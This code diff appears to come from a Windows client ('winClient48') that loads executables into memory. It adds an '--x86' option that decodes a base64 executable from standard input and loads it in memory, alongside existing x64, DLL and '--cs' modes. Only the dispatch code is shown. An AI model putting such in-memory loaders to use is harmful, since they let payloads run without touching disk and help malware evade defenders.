@@ -38,12 +38,19 @@ namespace winClient48
 
                         loader.fnLdrLoadDll(abDllBytes);
                     }
+                    else if (args[0] == "--x86")
+                    {
+                        string szB64 = Console.In.ReadToEnd();
+                        byte[] abExe = Convert.FromBase64String(szB64);
+
+                        var ret = loader.fnX86PELoader(abExe);
+                    }
                     else if (args[0] == "--x64")
                     {
                         string szB64 = Console.In.ReadToEnd();
                         byte[] abExe = Convert.FromBase64String(szB64);
 
-                        var ret = loader.fnLoadPeIntoMemory(abExe);
+                        var ret = loader.fnX64PELoader(abExe);
                     }
                     else if (args[0] == "--cs")
                     {
